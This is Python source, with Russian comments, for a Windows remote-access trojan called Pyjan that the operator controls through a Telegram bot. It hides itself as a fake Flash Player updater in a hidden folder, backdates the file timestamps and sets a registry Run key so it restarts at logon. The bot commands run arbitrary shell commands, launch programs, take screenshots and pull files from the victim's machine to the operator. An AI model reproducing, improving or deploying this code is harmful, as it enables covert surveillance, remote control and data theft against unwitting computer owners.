# -*- coding: utf-8 -*-

import os
import sys
import time
import shutil
import winreg
import getpass
import telepot
import requests
import win32api
import winshell
import threading
import subprocess			
import encodings.idna				# requests ругался на отсутствие idna-колировок, решается импортом
from PIL import ImageGrab
from telepot.loop import MessageLoop

class Pyjan:
	def __init__(self):
		try:
			if sys.argv[1] == "--quiet":
				pass
		except IndexError:
			self.set_autorun()                                 # Если программа запущена не из автозапуска, то добавляем
		
		MessageLoop(bot, self.bot_handler).run_as_thread()
		print("[*] Bot connected.")
		for chat in trusted_chats:
			bot.sendMessage(chat, "[*] Bot connected.")
		for user in trusted_hackers:
			bot.sendMessage(user, "[*] Bot connected.")

		while True:
			time.sleep(10)
	
	def set_autorun(self):
		application = sys.argv[0]
		print(application)
		start_path = os.path.join(os.path.abspath(os.getcwd()), application)   # Получаем наше местонахождение

		copy2_path = "{}\\{}".format(winshell.my_documents(), "Adobe flash player")
		copy2_app = os.path.join(copy2_path, "Flash player updater.exe")
        
		if not os.path.exists(copy2_path):
			os.makedirs(copy2_path)
    
		win32api.CopyFile(start_path, copy2_app)       # Копируем приложение в папку с незамысловатым названием

		win32api.SetFileAttributes(copy2_path, 2)      # Делаем папку невидимой
		os.utime(copy2_app, (1282372620, 1282372620))  # Меняем дату создания папки
		os.utime(copy2_path, (1282372620, 1282372620)) # и программы

		startup_val = r"Software\Microsoft\Windows\CurrentVersion\Run"
		key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_val, 0, winreg.KEY_ALL_ACCESS)
		winreg.SetValueEx(key2change, 'Test', 0, winreg.REG_SZ, start_path+" --quiet") # Добавляем программу в автозагрузку с помощью ключа реестра
		

	def bot_handler(self, message):
		print(message)

		userid = message["from"]["id"]
		chatid = message["chat"]["id"]

		if userid in trusted_users or chatid in trusted_chats:
			try:
				args = message["text"].split()
			except KeyError:
				args = [""]

				if "document" in message:
					file_id = message["document"]["file_id"]
					file_name = message["document"]["file_name"]
				elif "photo" in message:
					file_id = message["photo"][-1]["file_id"]
					print(message["photo"])
					file_name = "{}.jpg".format(file_id)

				file_path = bot.getFile(file_id)['file_path']
				link = "https://api.telegram.org/file/bot{}/{}".format(token, file_path)
				File = requests.get(link, stream=True).raw
				print(link)

				save_path = os.path.join(os.getcwd(), file_name)
				with open(save_path, "wb") as out_file:
					shutil.copyfileobj(File, out_file)
				
				bot.sendMessage(message["chat"]["id"], "[*] file uploaded")

			if args[0] == "/help":
				s = """/help - помощь
					/cmd	- выполнить cmd команду, требующую возвращения результата
					/run    - запустить программу, не требующую возвращения результатов
					/pwd	- текущая дериктория
					/ls	- показать файлы в директории
					/cd	- сменить дерикторию
					/screen - сделать скриншот экрана
					/download - скачать файл с компьютера
				"""
				bot.sendMessage(message["chat"]["id"], str(s))

			elif args[0] == "/cmd":
				try:
					s = "[*] {}".format(subprocess.check_output(' '.join(args[1:]), shell=True))
				except Exception as e:
					s = "[!] {}".format(e)

				bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))			

			elif args[0] == "/run":
				try:
					s = "[*] Program started"
					subprocess.Popen(args[1:], shell=True)
					
				except Exception as e:
					s = "[!] {}".format(str(e))
				bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))

			elif args[0] == "/pwd":
				try:
					s = os.path.abspath(os.getcwd())
				except Exception as e:
					s = e
				
				bot.sendMessage(message["chat"]["id"], "[*] {}".format(str(s)))
			elif args[0] == "/ls":
				if len(args) == 1:
					pth = "."
				else:
					pth = args[1]
				s = '\n'.join(os.listdir(path=pth))
				bot.sendMessage(message["chat"]["id"], "[*] {}".format(str(s)))
				
			elif args[0] == "/cd":
				path = os.path.abspath(args[1])
				os.chdir(path)
				bot.sendMessage(message["chat"]["id"], "[*] changing directory to {} ...".format(str(path)))
				
			elif args[0] == "/screen":
				image = ImageGrab.grab()
				image.save("pic.jpg")
				bot.sendDocument(message["chat"]["id"], open("pic.jpg", "rb"))
				os.remove("pic.jpg")

			elif args[0] == "/download":
				File = ' '.join(map(str, args[1:]))
				try:
					bot.sendDocument(message["chat"]["id"], open(File, "rb"))
				except Exception:
					bot.sendMessage(message["chat"]["id"], "[!] you must select the file")
			elif args[0] == "":
				pass

			else:
				bot.sendMessage(message["chat"]["id"], "[*] /help для вывода команд")

		else:
			bot.sendMessage(message["chat"]["id"], "Уходи.")

if __name__ == '__main__':
	token = ""
	bot = telepot.Bot(token)
	
	trusted_users = []
	trusted_chats = []
	
	trojan = Pyjan()
